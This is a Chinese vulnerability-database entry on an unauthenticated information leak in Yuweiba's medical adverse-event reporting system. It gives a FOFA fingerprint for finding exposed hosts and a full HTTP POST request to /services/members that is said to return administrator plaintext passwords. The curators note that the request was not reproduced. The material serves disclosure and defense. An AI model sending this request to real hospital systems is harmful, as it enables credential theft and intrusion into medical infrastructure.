---
source: "wy876 漏洞文库"
title: "鱼尾巴医疗安全不良事件报告系统 members列表信息泄露"
product: "鱼尾巴医疗安全不良事件报告系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，空user_class筛选含义未知"
prerequisites: "请求未带凭据"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/svb01mcl3q5d1dwx"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%B1%BC%E5%B0%BE%E5%B7%B4%E7%A7%91%E6%8A%80/%E5%8C%BB%E7%96%97%E5%AE%89%E5%85%A8%28%E4%B8%8D%E8%89%AF%29%E4%BA%8B%E4%BB%B6%E6%8A%A5%E5%91%8A%E7%B3%BB%E7%BB%9Fmembers%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"koma.Application\""
fofa_unverified: "body="
id: "vw-c2876c2223575e0606c55764"
entity_id: "ve-c2876c2223575e0606c55764"
schema_version: "1"
---

# 鱼尾巴医疗安全不良事件报告系统 members列表信息泄露

## 条目说明

- 对象与具体问题：鱼尾巴医疗安全不良事件报告系统；members列表信息泄露
- 版本、配置及部署条件：版本未知，空user_class筛选含义未知
- 认证与权限前提：请求未带凭据
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 没有返回字段和明文密码格式或登录结果，影响需证据限定
- 自定义application/x-dctech-json-rpc应保留，缺版本及修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
鱼尾巴科技专注于医疗质控,为医院提供完整医疗质量解决方案,按照国家卫健委评审标准和中国医院质量安全管理标准,研发了医院等级评审系统、医疗安全(不良)事件报告系统、不良事件管理系统等。其中旗下医疗安全(不良)事件报告系统members存在信息泄露漏洞，通过该漏洞可获取管理员明文密码进入后台。

## 二、影响版本
+ 医疗安全(不良)事件报告系统

## 三、资产测绘
+ fofa`body="koma.Application"`
+ 特征


## 四、漏洞复现
```http
POST /services/members HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-dctech-json-rpc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Priority: u=0

{"method":"fetch","params":{"service":"members","user_class":""}}
```

> 请求长度说明：原资料 Content-Length 为 66；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/svb01mcl3q5d1dwx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
